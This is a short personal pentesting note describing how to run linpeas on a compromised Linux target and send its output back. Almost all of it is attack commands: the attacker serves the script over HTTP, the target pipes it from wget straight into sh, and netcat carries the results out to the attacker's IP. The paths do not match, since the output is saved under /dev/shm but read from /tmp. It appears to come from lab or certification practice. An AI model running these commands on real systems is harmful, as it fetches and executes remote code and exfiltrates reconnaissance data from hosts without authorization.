# export-linpeas-output-as-ansi

**Author:** Julien Bongars\
**Date:** 2026-07-09 07:14:42
**Path:** `/home/julien/.hacklas/notes/escalation/linux/export-linpeas-output-as-ansi.md`

---

## Flow

```bash
# attacker
cd /usr/share/peass/linpeas
python -m http.server 80

# target
script -q -c "wget -O - http://192.168.45.177/linpeas.sh | sh" /dev/shm/linpeas.txt

# attacker
# Ctrl-z
gtt
cd escalation
nc -lvnp 8080 > linpeas.txt

# target
cat /tmp/linpeas.txt | nc 192.168.45.177 8080
```
